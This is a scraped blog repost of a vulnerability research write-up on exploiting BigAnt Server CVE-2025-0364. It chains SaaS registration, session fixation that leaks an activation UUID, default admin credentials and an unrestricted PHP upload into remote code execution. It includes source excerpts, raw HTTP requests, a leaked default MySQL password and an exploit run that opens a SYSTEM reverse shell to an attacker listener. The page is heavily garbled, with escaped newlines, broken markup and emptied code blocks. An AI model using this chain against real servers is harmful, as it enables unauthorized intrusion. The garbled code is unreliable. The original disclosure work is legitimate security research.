<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>BigAnt CVE-2025-0364 Exploitation - Blog - VulnCheck</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>
	==========================<br>
	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
	==========================
	<div style="float: right;">A Techi Personal Blog</div><br>
	<p>
	<nav>
			<a href="/"><b>Start</b></a>.
			
			
			<a href="/posts/"><b>Posts</b></a>.
			
			<a href="/categories/"><b>Categories</b></a>.
			
			<a href="/tags/"><b>Tags</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>BigAnt CVE-2025-0364 Exploitation - Blog - VulnCheck</h1>
			<b><time>27.02.2025 00:00</time></b>
		       

			<div>
				<h1 id="bigant-cve-2025-0364-exploitation---blog---vulncheck">BigAnt CVE-2025-0364 Exploitation - Blog - VulnCheck</h1>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>\n</p>
<p>\n</p>
<p>{:L(&rsquo;_SAAS_REGISTER_&rsquo;)}</p>
<p>\n</p>
<p>\n</p>
<p>\n</p>
<p>\n \n</p>
<p>\n</p>
<p>\n \n</p>
<p>\n</p>
<p>\n \n</p>
<p>\n</p>
<p>\n \n</p>
<p>\n\n```\n\nThe `reg_email_post` function call is called inside of `Application/Home/Controller/SaasController.class.php:63`, which handles the sending of the email with the filled in data from the backend and user provided information. We want to follow the logic of where the UUID gets set and that appears in the following as the `saas_id`:\n\n```php\n/**\n * 邮箱saas\n * 1 新增SAAS\n * 2 发送邮件\n * 3 通过邮件地址激活SAAS\n */\nfunction reg_email_post(){\n\n /*\n if(!$this-&gt;check_verify(I(&lsquo;verify&rsquo;))){\n $this-&gt;error(L(&rsquo;_VALID_VERIFY_ERROR_&rsquo;));exit;\n };\n */\n \n $res = $this-&gt;reg_saas(0);\n \n if($res[&lsquo;status&rsquo;]){\n $url = sp_get_host() . U(&lsquo;reg_activation&rsquo;,array(&lsquo;saas_id&rsquo;=&gt;$saasId)) ; //生成激活的URL地址\n //发送邮件\n $subject = L(&rsquo;_ACTIVATION_MAIL_SUBJECT_&rsquo;) ;\n $content = L(&rsquo;_ACTIVATION_MAIL_CONTENT_&rsquo;) ;\n $content = str_replace(&rsquo;[url]&rsquo;,$url,$content);\n $content = str_replace(&rsquo;[minute]&rsquo;,$M-&gt;activation_expire_miniute,$content);\n $res =sp_send_mail($data[&lsquo;org_email&rsquo;], $subject, $content) ;\n if ($res){\n $url = U(&lsquo;reg_email_ok&rsquo;,array(&lsquo;saas_id&rsquo;=&gt;$saasId));\n $this-&gt;success(L(&rsquo;_ADD_SUCCESS_&rsquo;), $url);\n }else{\n $this-&gt;error($res[&rsquo;err_msg&rsquo;]);\n }\n }else{\n $this-&gt;error($M-&gt;getError());\n }\n}\n```\n\nBased on some light ThinkPHP knowledge, we know that the application utilizes a `create()` and `add()` inheritance to handle creation of database objects. After the email is sent the user is redirected to a `reg_saas` route and calls the function in `Application/Home/Controller/SaasController.class.php` with the registration `POST` request to `/index.php/Home/Saas/reg_saas`. The following snippet completes the account registration step and creates the `saas_id` and updates the database:\n\n```php\n/**\n * 注册SAAS\n * @param number $status\n * @param number $is_send_activation_email 是否发送激活邮件(官方注册，外面发送)\n * @return number|unknown\n */\nfunction reg_saas($status = 0,$is_send_activation_email = 1){\n \n $M = D(&lsquo;Common/Saas&rsquo;);\n\n $M-&gt;is_send_activation_email = $is_send_activation_email ;\n \n //清除过期无效的数据\n $M-&gt;clearExpire();\n \n\n $data = $M-&gt;create();\n\n if (!$data){\n return sp_api_fail(0, $M-&gt;getError()) ;\n }\n \n $data[&lsquo;saas_status&rsquo;] = $status ;\n $res = $M-&gt;add($data);\n\n //更新接口服务\n if ($res &amp;&amp; $status){\n $param = $M-&gt;where(array(&lsquo;saas_name&rsquo;=&gt;$data[&lsquo;saas_name&rsquo;]))-&gt;field(&lsquo;saas_id&rsquo;)-&gt;find();\n \Common\Lib\AntCmd::execUpdatePack(CMD_SAAS_UPDATE, $param[&lsquo;saas_id&rsquo;]) ;\n }\n \n if ($res){\n return sp_api_success($data);\n }else{\n return sp_api_fail(0, $M-&gt;getError()) ;\n }\n \n \n}\n```\n\nThere&rsquo;s a lot more ThinkPHP logic that handles the MVC components that wasn&rsquo;t worth stepping through, so when in doubt `ripgrep`. A quick search and a validation that the default install provides a MySQL server landed me at the `Application/Install/Data/dbcreate/ms_mysql.sql` install SQL file:\n\n```sql\n&ndash; &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-\n&ndash; Table structure for sys_saas\n&ndash; &mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;-\nDROP TABLE IF EXISTS `sys_saas`;\nCREATE TABLE `sys_saas` (\n `SAAS_ID` varchar(50) NOT NULL DEFAULT &lsquo;&rsquo;,\n `SAAS_NAME` varchar(100) DEFAULT &lsquo;&rsquo;,\n `SAAS_SHOWNAME` varchar(100) DEFAULT &lsquo;&rsquo;,\n `SAAS_DBNAME` varchar(50) DEFAULT &lsquo;&rsquo;,\n `SAAS_DESC` varchar(255) DEFAULT &lsquo;&rsquo;,\n `SAAS_CREATE_DATE` bigint(20) DEFAULT &lsquo;0&rsquo;,\n `SAAS_STATUS` int(2) DEFAULT &lsquo;0&rsquo;,\n `ORG_CONTACT` varchar(50) DEFAULT &lsquo;&rsquo;,\n `ORG_PHONE` varchar(50) DEFAULT &lsquo;&rsquo;,\n `ORG_ADDRESS` varchar(255) DEFAULT &lsquo;&rsquo;,\n `ORG_EMAIL` varchar(50) DEFAULT &lsquo;&rsquo;,\n `ORG_FAX` varchar(50) DEFAULT &lsquo;&rsquo;,\n `ORG_POSTCODE` varchar(50) DEFAULT &lsquo;&rsquo;,\n `AUTH_NUMBERS` varchar(100) DEFAULT &lsquo;0&rsquo;,\n `AUTH_CODE` varchar(2000) DEFAULT &lsquo;&rsquo;,\n `AUTH_EXPIREDATE` varchar(255) DEFAULT &lsquo;0&rsquo;,\n `SAAS_PWD` varchar(50) DEFAULT &lsquo;&rsquo;,\n `SAAS_INSTALLDATE` varchar(255) DEFAULT &lsquo;&rsquo;,\n PRIMARY KEY (`SAAS_ID`)\n) ENGINE=InnoDB DEFAULT CHARSET=utf8;\n```\n\nGreat, now we have the corresponding table that handles SaaS registration and we just need to verify that our data is in the database. Another quick little grep for the MySQL connection string shows the following:\n\n```php\nDemo/Controller/TestController.class.php\n29: $dbconfig[&lsquo;DB_TYPE&rsquo;]=&lsquo;mysql&rsquo; ;\n55: $conns[] = array(&lsquo;mysql&rsquo;,&lsquo;127.0.0.1&rsquo;,&lsquo;3306&rsquo;,&lsquo;root&rsquo;,&lsquo;<a href="https://www.upsoft01.com">www.upsoft01.com</a>&rsquo;,&lsquo;antdbms_aipu&rsquo;);\n85: //$conns[] = array(&lsquo;mysql&rsquo;,&lsquo;127.0.0.1&rsquo;,&lsquo;3306&rsquo;,&lsquo;root&rsquo;,&lsquo;<a href="https://www.upsoft01.com">www.upsoft01.com</a>&rsquo;,&lsquo;antdbms_aipu&rsquo;);\n214: //var_dump(function_exists(&lsquo;mysql_connect&rsquo;));\n```\n\nSure enough, a quick MySQL connection on the server later with `root:www.upsoft01.com` and we can see the following entries for the table:\n\n![BigAnt registration sys_saas database entries](/blog/bigant-cve-2025-0364/bigant-3-saas-registration-db.png){:width=&ldquo;100%&rdquo;}\n\nThis validates that the entries are actually be created with the data we provided, and shows that we need to figure out a way to get access to the `SAAS_ID` value. It&rsquo;s also important to note the multiple UUIDs and SaaS organizations, as it will come up later when we mature the exploit.\n\n## Debug Activation UUID Leak\n\nA quick glance through the application logic shows that we need to look for instances where `$_SESSION[&lsquo;saas&rsquo;]` or `sp_saas_id()` is called and accessible by a user or unauthenticated in order for us to recover the UUID. The `sp_saas_id` function can be found in `Application/Common/Common/site.php:143` and corroborates this:\n\n```php\nfunction sp_saas_id(){\n if (! $_SESSION[&lsquo;saas&rsquo;])\n return &lsquo;&rsquo;;\n\n return $_SESSION[&lsquo;saas&rsquo;][&lsquo;saas_id&rsquo;];\n}\n```\n\nSome static analysis (ripgrep my dearest) allowed us to identify roughly ~200 instances of `sp_saas_id` calls, and some more quick session checks narrow down any that don&rsquo;t require authentication. One entry stood out far more than the others in `Application/Demo/View/Api/index.html`:\n\n```html\n\n\n \n \n \n \n \n \n \n \n \n \n \n \n \n \n</p>
<h1 id="modulenamemethodnamemethodintro">{$module[&rsquo;name&rsquo;]}/{$method[&rsquo;name&rsquo;]}【{$method[&lsquo;intro&rsquo;]}】</h1>
<p>\n</p>
<p>\n <a href="#">{:L(&rsquo;_CLEAN_SELECT_OPTIONS_&rsquo;)}</a>\n</p>
<p>\n \n</p>
<p>\n ssid\n \n SAAS ID\n</p>
<p>\n</p>
<p>\n <em>*</em> uid\n```\n\nOpening up this page in a empty session shows the following demo page, which contains almost all API calls but most importantly fills the forms with the called `sp_saas_id` function call:\n\n![BigAnt demo page leaking sp_saas_id](/blog/bigant-cve-2025-0364/bigant-4-demo-page.png){:width=&ldquo;100%&rdquo;}\n\nWhat&rsquo;s up with the `ssid` UUID value of `122C8BFA-BD74-9668-BE31-EA159FB2C437` and why is that the UUID tied to a `antdbms_pwn` object from the previous database `sys_saas` query? Where did it come from? \n\nIt turns out that SaaS ID from the application gets assigned to the first created `saas` organization and if your role or session does not have a currently assigned one, the first created one is set as the default. This presents a problem, we cannot retrieve the information that we submitted when registering when submitting the organization registration because that object will get assigned and we don&rsquo;t know the email, org name, and password for that organization. Theoretically, if the attacker creates the first organization this would be a usable path, but we want something better. Let&rsquo;s see if we can find a way to force a session to belong to a `saas` org with our controlled information and grantee success.\n\n## Forcing SaaS Session\n\nThis time, we weren&rsquo;t quite as lucky to find a session assigned variable in a debug page, nor a quick function call. Looking for all interactions with identified SaaS variable names gave us quite a few places to look. Ironically, some manual review showed that the primary login page index function contained some suspicious looking code at `Application/Home/Controller/LoginController.class.php:90`:\n\n```php\n/**\n * 登录\n */\npublic function index(){\n\n $to = I(&rsquo;to&rsquo;,&lsquo;admin&rsquo;,&lsquo;htmlspecialchars&rsquo;) ;\n $app = I(&lsquo;app&rsquo;);\n $saas = I(&lsquo;saas&rsquo;);\n\n if (! $saas) {\n $saas = cookie(&lsquo;saas&rsquo;);\n }\n \n\n \n //20170418 针对只有一个SAAS的企业，默认给出企业ID\n //李成提的需求\n $M = D(&lsquo;Common/Saas&rsquo;);\n $data = null ;\n if ($saas){\n //20170518 如果是登妨系统管理台，那个数据库密码如果是 默认密码，那么显示出来\n $data = $M-&gt;where(array(&lsquo;saas_name&rsquo;=&gt;$saas))-&gt;fetchSql(false)-&gt;select();\n }\n\n //\n if (! $data){\n $data = $M-&gt;fetchSql(false)-&gt;select();\n } \n\n \n $saas = $data[0][&lsquo;saas_name&rsquo;] ;\n\n \n\n //20170419 加入默认的帐号\n $account = htmlspecialchars($_COOKIE[&lsquo;account&rsquo;]) ;\n if (! $account){\n $account = &lsquo;superadmin&rsquo;;\n }\n \n \n $this-&gt;assign(&lsquo;saas&rsquo;,$saas) ;\n $this-&gt;assign(&lsquo;account&rsquo;,$account) ;\n $this-&gt;assign(&lsquo;metaTitle&rsquo;,C(&lsquo;PRODUCT_NAME&rsquo;) . &rsquo; &rsquo; . L(&rsquo;_LOGIN_TITLE_&rsquo;)) ;\n $this-&gt;assign(&rsquo;to&rsquo;,$to) ;\n $this-&gt;assign(&lsquo;app&rsquo;,$app) ;\n \n if(I(&lsquo;flag&rsquo;)){\n $this-&gt;assign(&lsquo;flag&rsquo;,I(&lsquo;flag&rsquo;)) ;\n }\n```\n\nIn summary, the main login page index function will look for an assigned `saas` session, if none is found it will look for a cookie named `saas` and assign (via `$this-&gt;assign()`) any matching SaaS organization set in that cookie to the session. \n\nIn order to test this we can request the login page with a `saas=aaa` cookie set in a new session:\n\n```html\nGET /index.php/Home/Login/index.html HTTP/1.1\nHost: 10.0.0.104:8000\nAccept-Language: en-US,en;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nCookie: saas=aaa\n\n\n```\n\nThen, take the session cookie from the above request and revisit the demo page to trigger the `ssid` output:\n\n![BigAnt demo page with attacker controlled SaaS](/blog/bigant-cve-2025-0364/bigant-5-demo-page-fixed-saas.png){:width=&ldquo;100%&rdquo;}\n\nBingo. We have tied the `saas` that we registered to our controlled value for the session and was able to successfully retrieve the `ssid` value.\n\nAll that&rsquo;s left is to verify the original hypothesis and attempt to complete the registration of the SaaS organization. The core function for registration activation lives in `Application/Home/Controller/SaasController.class.php:411`:\n\n```php\n/**\n * 激活SAAS\n * 1、获得SAAS\n * 2、判断是否超时\n * 3、判断是否激活\n * 4、激活SAAS\n */\nfunction reg_activation(){\n $saasId = I(&lsquo;saas_id&rsquo;);\n \n $M = D(&lsquo;Common/Saas&rsquo;);\n $info = $M-&gt;find($saasId) ;\n \n //判断是否有数据\n if (!$info){\n $this-&gt;error(L(&rsquo;_ACTIVATION_ERROR_NODATA_&rsquo;)) ;\n }\n \n //判断是否已经激活了\n if ($info[&lsquo;saas_status&rsquo;]){\n $this-&gt;error(L(&rsquo;_ACTIVATION_ERROR_ALREALY_&rsquo;)) ;\n }\n \n //判断是否过期\n if ($M-&gt;isExpire($info[&lsquo;saas_create_date&rsquo;])){\n $this-&gt;error(L(&rsquo;_ACTIVATION_ERROR_EXPIRE_&rsquo;)) ;\n }\n \n //激活数据\n $saasName = $info[&lsquo;saas_name&rsquo;] ;\n $res = $M-&gt;activationSaas($saasName) ;\n \n if ($res){\n $url = U(&lsquo;reg_complete&rsquo;,array(&lsquo;saas&rsquo;=&gt;$saasName));\n $this-&gt;success(L(&rsquo;_ACTIVATION_SUCCESS_&rsquo;), $url);\n }else{\n $this-&gt;error(L(&rsquo;_ACTIVATION_ERROR_&rsquo;));\n }\n}\n```\n\nIf the activation data is correct and the `saas_id` is the same as the `ssid` then this function calls `activationSaas` in `Application/Common/Model/SaasModel.class.php:146`:\n\n```php\n/**\n * 激活SAAS\n * @param unknown $saasName 企业ID (在LINUX上安装的时候会出现SAASID变成1,不知道什么原因，所以这里用企业ID来判断)\n * @param unknown $password 明文密码 用于发邮件\n */\npublic function activationSaas($saasName){\n\n $where[&lsquo;saas_name&rsquo;] = $saasName;\n $info = $this-&gt;where($where)-&gt;find();\n \n $saasId = $info[&lsquo;saas_id&rsquo;];\n $saasName = $info[&lsquo;saas_name&rsquo;];\n $dbName = $info[&lsquo;saas_dbname&rsquo;];\n $adminPassword = $info[&lsquo;saas_pwd&rsquo;];\n $installDate = $info[&lsquo;saas_installdate&rsquo;] ;\n \n if (! $info){\n return false ;\n }\n \n //创建数据库\n $res = $this-&gt;createDB($info);\n \n //设置SAAS的服务关系\n if ($res){\n $M = D(&lsquo;Ms/server&rsquo;);\n $server = $M-&gt;where(array(&lsquo;server_type&rsquo;,2))-&gt;find();\n \n if ($server){\n $serverId = $server[&lsquo;server_id&rsquo;];\n $sql = &quot; insert into sys_saas_server(gid,saas_id,login_server_id,server_is_mast) values(&rsquo;&quot; . sp_get_guid(). &ldquo;&rsquo;,&rsquo;$saasId&rsquo;,&rsquo;$serverId&rsquo;,1)&rdquo; ;\n $M-&gt;db-&gt;execute($sql);\n }\n }\n \n //更新状态\n $data[&lsquo;saas_status&rsquo;] = 1 ;\n $data[&lsquo;saas_id&rsquo;] = $saasId ;\n if (! $installDate){\n $data[&lsquo;saas_installdate&rsquo;] = \Common\Lib\AntCmd::getTryCode();\n $data[&lsquo;auth_numbers&rsquo;] = \Common\Lib\AntCmd::encrypt(50);\n $data[&lsquo;auth_expiredate&rsquo;] = \Common\Lib\AntCmd::encrypt(strtotime(date(&lsquo;Y-m-d H:i:s&rsquo;,strtotime(&rsquo;+15 day&rsquo;))));\n }\n $this-&gt;save($data);\n \n //发送邮件通知\n if ($this-&gt;is_send_activation_email){\n $this-&gt;sendMailNotify($info);\n }\n \n \n return true ;\n \n}\n```\n\nThis successfully activates the SaaS organization and sets up the organization with the data we initially registered with. Time to test the activation of our initial organization:\n\n```html\nPOST /index.php/Home/Saas/reg_activation HTTP/1.1\nHost: 10.0.0.104:8000\nContent-Length: 44\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36\nCookie: PHPSESSID=5q37l00e0alpb5euu40403tj3e;\nConnection: keep-alive\n\nsaas_id=1438134D-4ECD-9FBC-CE77-8EF6C37F47DE\n```\n\nThe server then responds with a &ldquo;Activate successfully&rdquo; and a little smiley face:\n\n```html\nHTTP/1.1 200 OK\nDate: Thu, 09 Jan 2025 19:52:29 GMT\nServer: Apache/2.4.46 (Win32) OpenSSL/1.1.1g PHP/7.4.14\nX-Powered-By: ThinkPHP\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: private\nPragma: no-cache\nContent-Length: 1655\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html; charset=utf-8\n\n\n\n\n\n跳转提示\n\n*{ padding: 0; margin: 0; }\nbody{ background: #fff; font-family: &lsquo;微软雅黑&rsquo;; color: #333; font-size: 16px; }\n.system-message{ padding: 24px 48px; }\n.system-message h1{ font-size: 100px; font-weight: normal; line-height: 120px; margin-bottom: 12px; }\n.system-message .jump{ padding-top: 10px}\n.system-message .jump a{ color: #333;}\n.system-message .success,.system-message .error{ line-height: 1.8em; font-size: 36px }\n.system-message .detail{ font-size: 12px; line-height: 20px; margin-top: 12px; display:none}\n\n\n\n</p>
<p>\n</p>
<h1 id="heading">:)</h1>
<p>\n</p>
<p>Activate successfully</p>
<p>\n</p>
<p>\n</p>
<p>\n\n```\n\nWe now have an activated SaaS org and the information on how to authenticate to the system. In order to actually do this and to see what we can do post-authentication, we need to first find where to use these credentials.\n\n## &ldquo;Cloud Drive&rdquo; Authentication &amp; Just Upload PHP I Guess\n\nUsing the data from the first initial crawl for unauthenticated pages we quickly identified that `/index.php/Addin/login/index.html` would provide an authentication page requesting the company code, username, and password:\n\n![BigAnt Addin login page with data that was utilized to register the SaaS organization](/blog/bigant-cve-2025-0364/bigant-6-saas-login.png){:width=&ldquo;100%&rdquo;}\n\nThe only information that we didn&rsquo;t submit in the initial registration was the username. A quick cross-reference in the database with the newly created SaaS organization in `antdbms_aaa` shows that the username that gets created with `admin` (shocking). A quick submission with `aaa` as the company code and `admin:123456` and we land on `/index.php/addin/public/load/clientid/1.html`, which provides the following page:\n\n![BigAnt post-authentication landing page for the add-in section. A Cloud Disk button and Bulletin button is visible](/blog/bigant-cve-2025-0364/bigant-8-saas-login-landing.png){:width=&ldquo;100%&rdquo;}\n\nWe have officially confirmed and validated authentication. Instead of going straight for the SQL injection in the original CVE, Plus, the &ldquo;Cloud Disk&rdquo; is intriguing and didn&rsquo;t match much of the code I&rsquo;d seen used in the rest of the application. Let&rsquo;s see what happens when we go to the Cloud Disk:\n\n![BigAnt Cloud Disk page displaying cloud disk filesystem icons](/blog/bigant-cve-2025-0364/bigant-9-saas-login-cloud-drive.png){:width=&ldquo;100%&rdquo;}\n\nClicking on the Personal Cloud Disk link in the Drive page immediately leads us to the following page:\n\n![BigAnt Cloud Disk file upload page](/blog/bigant-cve-2025-0364/bigant-10-saas-cloud-drive-upload-page.png){:width=&ldquo;100%&rdquo;}\n\nOh goodie a upload page. We are building a tower, but entirely made out of red flags.\n\nIf you immediately started thinking of MIME type sniffing bypasses or extension tricks on Windows related to recent disclosures, I applaud you but you might be overthinking. Let&rsquo;s just try and upload some PHP:\n\n```php\n\n```\n\nThe application happily accepts our very hard fought PHP file and happily presents the uploaded PHP file:\n\n![BigAnt Cloud Disk successfully uploading PHP file](/blog/bigant-cve-2025-0364/bigant-12-saas-cloud-drive-upload-php.png){:width=&ldquo;100%&rdquo;}\n\nThe preview options and other interaction pages will not work, but the HTML references the page just fine at `/data/CB1E3E2E-58C5-0CB6-BD29-397DF76AB254/pan/C65DC0F8-E4E8-8FB2-E345-6C53ABCE8D03/2025-02-21/pwn.php` so we open up the file and reach the finishing line:\n\n![BigAnt PHP file execution](/blog/bigant-cve-2025-0364/bigant-13-saas-cloud-drive-php-exec.png)\n\nSometimes the silliest things work the best. We officially have a full exploit chain to go from no authentication to arbitrary PHP execution. Let&rsquo;s automate and mature it into an exploit.\n\n## Automation with go-exploit\n\nIn summary, the vulnerability requires the following HTTP requests to achieve full code execution:\n\n1. Get the CAPTCHA and CSRF tokens.\n2. Solve CAPTCHA manually.\n3. Register a new SaaS organization with the CAPTCHA and CSRF tokens from steps 1 &amp; 2 with registration settings.\n4. In a new session, request the login page with a `saas=` cookie set to the new organization in step 3, this causes the new session to be bound to the SaaS instance the attacker just registered.\n5. Use the session cookie from step 4 to request the demo page that displays SaaS UUID, requiring the bound SaaS session or else the application will bind the session to the default SaaS organization which is not known to the attacker.\n6. Activate the registered organization with the SaaS UUID acquired in step 5.\n7. Authenticate to the &ldquo;Cloud Drive&rdquo; page with the `admin` account of the organization and the attacker controlled registration data.\n8. Get the Cloud Drive root IDs, UUIDs, date in `YYYY-MM-DD` format, and path information in order to know where the file is accessible.\n9. Upload a PHP payload, note the paths and upload dates.\n10. Trigger the PHP shell with the paths without authentication.\n\nThis is the perfect opportunity to use [go-exploit](<a href="https://github.com/vulncheck-oss/go-exploit">https://github.com/vulncheck-oss/go-exploit</a>) to create a small self contained exploit. All said and done the exploit was only roughly <del>350 lines of code. The framework is the exact same system that the VulnCheck Initial Access Intelligence team uses to quickly create self-contained and mature exploits, and we are giving out our copy of CVE-2025-0364 to show off how well it works for situations like this: <a href="https://github.com/vulncheck-oss/cve-2025-0364">https://github.com/vulncheck-oss/cve-2025-0364</a>\n\nFor the moment of truth, retrieve the CAPTCHA and pre-conditions for the exploit:\n\n```bash\npoptart@grimm:</del>/src/initial-access/feed/cve-2025-0364 $ ./build/cve-2025-0364_linux-amd64 -rhost 10.0.0.104 -rport 8000 -v -c -e\ntime=2025-01-09T14:49:56.227-07:00 level=STATUS msg=&ldquo;Starting target&rdquo; index=0 host=10.0.0.104 port=8000 ssl=false &ldquo;ssl auto&rdquo;=false\ntime=2025-01-09T14:49:56.227-07:00 level=STATUS msg=&ldquo;Validating Bigantsoft Bigant Server target&rdquo; host=10.0.0.104 port=8000\ntime=2025-01-09T14:49:56.272-07:00 level=SUCCESS msg=&ldquo;Target verification succeeded!&rdquo; host=10.0.0.104 port=8000 verified=true\ntime=2025-01-09T14:49:56.272-07:00 level=STATUS msg=&ldquo;Running a version check on the remote target&rdquo; host=10.0.0.104 port=8000\ntime=2025-01-09T14:49:56.301-07:00 level=VERSION msg=&ldquo;The reported version is 5.6.06&rdquo; host=10.0.0.104 port=8000 version=5.6.06\ntime=2025-01-09T14:49:56.301-07:00 level=SUCCESS msg=&ldquo;The target appears to be a vulnerable version!&rdquo; host=10.0.0.104 port=8000 vulnerable=yes\ntime=2025-01-09T14:49:56.301-07:00 level=STATUS msg=&ldquo;CAPTCHA flags not set, retrieving captcha-hash&rdquo;\ntime=2025-01-09T14:49:56.317-07:00 level=STATUS msg=&ldquo;Open the following page in a browser and solve the CAPTCHA: http://10.0.0.104:8000/index.php/Home/Public/verify&rdquo;\ntime=2025-01-09T14:49:56.317-07:00 level=STATUS msg=&ldquo;Solve CAPTCHA and pass the following flags to this exploit: `-captcha-hash 652def5853ff0030a259b30af8e7facb_6e58b283a2a66e4db833ac2547019a30 -captcha-session 4fbsn0i6bdiuu6vuik99gbhndb -captcha `&rdquo;\n```\n\nSolve the CAPTCHA and fire away to get a good ol&rsquo; `NT AUTHORITY\SYSTEM` reverse shell:\n\n```sh\npoptart@grimm:~/src/initial-access/feed/cve-2025-0364 $ ./build/cve-2025-0364_linux-amd64 -rhost 10.0.0.104 -rport 8000 -lhost 10.0.1.10 -lport 1337 -v -c -e -captcha-hash 652def5853ff0030a259b30af8e7facb_6e58b283a2a66e4db833ac2547019a30 -captcha-session 4fbsn0i6bdiuu6vuik99gbhndb -captcha VKZ6\ntime=2025-01-09T14:50:18.502-07:00 level=STATUS msg=&ldquo;Certificate not provided. Generating a TLS Certificate&rdquo;\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg=&ldquo;Starting TLS listener on 10.0.1.10:1337&rdquo;\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg=&ldquo;Starting target&rdquo; index=0 host=10.0.0.104 port=8000 ssl=false &ldquo;ssl auto&rdquo;=false\ntime=2025-01-09T14:50:18.575-07:00 level=STATUS msg=&ldquo;Validating Bigantsoft Bigant Server target&rdquo; host=10.0.0.104 port=8000\ntime=2025-01-09T14:50:18.620-07:00 level=SUCCESS msg=&ldquo;Target verification succeeded!&rdquo; host=10.0.0.104 port=8000 verified=true\ntime=2025-01-09T14:50:18.620-07:00 level=STATUS msg=&ldquo;Running a version check on the remote target&rdquo; host=10.0.0.104 port=8000\ntime=2025-01-09T14:50:18.650-07:00 level=VERSION msg=&ldquo;The reported version is 5.6.06&rdquo; host=10.0.0.104 port=8000 version=5.6.06\ntime=2025-01-09T14:50:18.650-07:00 level=SUCCESS msg=&ldquo;The target appears to be a vulnerable version!&rdquo; host=10.0.0.104 port=8000 vulnerable=yes\ntime=2025-01-09T14:50:18.650-07:00 level=STATUS msg=&ldquo;Password that will be used for authentication: kyLZiAddnH&rdquo;\ntime=2025-01-09T14:50:18.650-07:00 level=STATUS msg=&ldquo;Registering SaaS org: LBJCUE (<a href="mailto:mpzo@fldlmarv.com">mpzo@fldlmarv.com</a>) with password: kyLZiAddnH&rdquo;\ntime=2025-01-09T14:50:18.675-07:00 level=STATUS msg=&ldquo;Getting new PHP session and pinning the SaaS org to the session&rdquo;\ntime=2025-01-09T14:50:18.747-07:00 level=STATUS msg=&ldquo;Retrieving org SSID from demo page with session v1cir7mh9v4dfv4ik54mhq6so0&rdquo;\ntime=2025-01-09T14:50:18.764-07:00 level=STATUS msg=&ldquo;Retrieved SSID for LBJCUE: 387360F0-EECD-622B-5B90-C37F2BBD45B3&rdquo;\ntime=2025-01-09T14:50:18.765-07:00 level=STATUS msg=&ldquo;Activating SaaS organization&rdquo;\ntime=2025-01-09T14:50:22.627-07:00 level=STATUS msg=&ldquo;Authenticating to the addin SaaS admin&rdquo;\ntime=2025-01-09T14:50:22.673-07:00 level=STATUS msg=&ldquo;Visiting SaaS addin cloud drive page&rdquo;\ntime=2025-01-09T14:50:22.762-07:00 level=STATUS msg=&ldquo;Got cloud drive root path UUID: 99C8911A-DCB3-E5F2-4298-1E3567AA0DAD&rdquo;\ntime=2025-01-09T14:50:22.762-07:00 level=STATUS msg=&ldquo;Attempting to upload `JQsaYCKEOu.php` to cloud drive addin&rdquo;\ntime=2025-01-09T14:50:22.819-07:00 level=STATUS msg=&ldquo;Attempting to trigger final payload, timeout is expected after callback&rdquo;\ntime=2025-01-09T14:50:22.819-07:00 level=STATUS msg=&ldquo;Requesting final payload at: http://10.0.0.104:8000/data/387360F0-EECD-622B-5B90-C37F2BBD45B3/pan/99C8911A-DCB3-E5F2-4298-1E3567AA0DAD/2025-01-09/JQsaYCKEOu.php&rdquo;\ntime=2025-01-09T14:50:22.821-07:00 level=SUCCESS msg=&ldquo;Caught new shell from 10.0.0.104:51690&rdquo;\ntime=2025-01-09T14:50:22.821-07:00 level=STATUS msg=&ldquo;Active shell from 10.0.0.104:51690&rdquo;\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\Program Files (x86)\BigAntSoft\IM Console\im_webserver\htdocs\data\387360F0-EECD-622B-5B90-C37F2BBD45B3\pan\99C8911A-DCB3-E5F2-4298-1E3567AA0DAD\2025-01-09&gt;whoami\nwhoami\nnt authority\system\n\nC:\Program Files (x86)\BigAntSoft\IM Console\im_webserver\htdocs\data\387360F0-EECD-622B-5B90-C37F2BBD45B3\pan\99C8911A-DCB3-E5F2-4298-1E3567AA0DAD\2025-01-09&gt;^C\n```\n\nSometimes an incorrectly categorized CVSS vector is all it takes to motivate you to find something interesting.\n\n## About VulnCheck\n\nThe VulnCheck Initial Access team is always on the lookout for new exploitation in the wild. For more research like this, see our blogs, [Four-Faith Industrial Router CVE-2024-12856 Exploited in the Wild](<a href="https://vulncheck.com/blog/four-faith-cve-2024-12856)">https://vulncheck.com/blog/four-faith-cve-2024-12856)</a>, [PaperCut Exploitation](<a href="https://vulncheck.com/blog/papercut-rce)">https://vulncheck.com/blog/papercut-rce)</a>, [ProjectSend CVE-2024-11680 Exploited in the Wild](<a href="https://vulncheck.com/blog/projectsend-exploited-itw)">https://vulncheck.com/blog/projectsend-exploited-itw)</a>, [Fileless Remote Code Execution on Juniper Firewalls\n](<a href="https://vulncheck.com/blog/juniper-cve-2023-36845)">https://vulncheck.com/blog/juniper-cve-2023-36845)</a>, and [Does Confluence Dream of Shells?](<a href="https://vulncheck.com/blog/confluence-dreams-of-shells">https://vulncheck.com/blog/confluence-dreams-of-shells</a>)\n\nSign up to our website today to get free access to our [VulnCheck KEV](<a href="https://vulncheck.com/kev">https://vulncheck.com/kev</a>) and request a trial of our [Initial 